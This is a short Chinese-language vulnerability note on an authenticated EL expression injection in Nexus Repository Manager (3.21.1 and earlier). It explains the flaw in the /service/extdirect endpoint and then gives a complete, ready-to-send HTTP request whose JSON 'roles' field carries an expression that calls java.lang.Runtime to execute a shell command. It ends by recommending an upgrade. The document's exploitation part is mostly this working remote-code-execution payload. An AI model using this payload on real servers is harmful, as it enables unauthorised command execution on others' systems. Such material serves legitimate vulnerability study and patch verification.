### 一 漏洞描述
Nexus 是一个 Maven 的仓库管理系统，它提供了强大的仓库管理、构件搜索等功能，并且可以用来搭建 Maven 仓库私服，在代理远程仓库的同时维护本地仓库，以节省带宽和时间。  

此漏洞涉及到的接口为/service/extdirect，接口需要管理员账户权限进行访问。  
该接口中处理请求时的UserComponent对象的注解的校验中使用EL引擎渲染，可以在访问接口时发送精心构造的恶意JSON数据，造成EL表达式注入进而远程执行任意命令。

Nexus Repository Manager OSS/PRo <=3.21.1

### 二 漏洞利用
该漏洞需要管理员账号身份，登录后，复制当前Cookie和CSRF Token
```
POST /service/extdirect HTTP/1.1
Host: 192.168.0.142:8081
Content-Length: 223
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.6813274455108288
Content-Type: application/json
Accept: */*
Origin: http://192.168.0.142:8081
Referer: http://192.168.0.142:8081/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 278d086ce087c25389bba6fecb03d8a9=3f769ae53838e13e44a4ee0a5fe70526; NX-ANTI-CSRF-TOKEN=0.6813274455108288; NXSESSIONID=5337e2ee-1fd7-4a7f-9386-4b24280fb268
Connection: close

{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"2","firstName":"admin","lastName":"User","email":"admin@example.org","status":"active","roles":["nxadmin$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')}],"type":"rpc","tid":11}
```
### 三 漏洞修复
升级

> 参考链接  
> https://blog.csdn.net/weixin_44508748/article/details/109897749
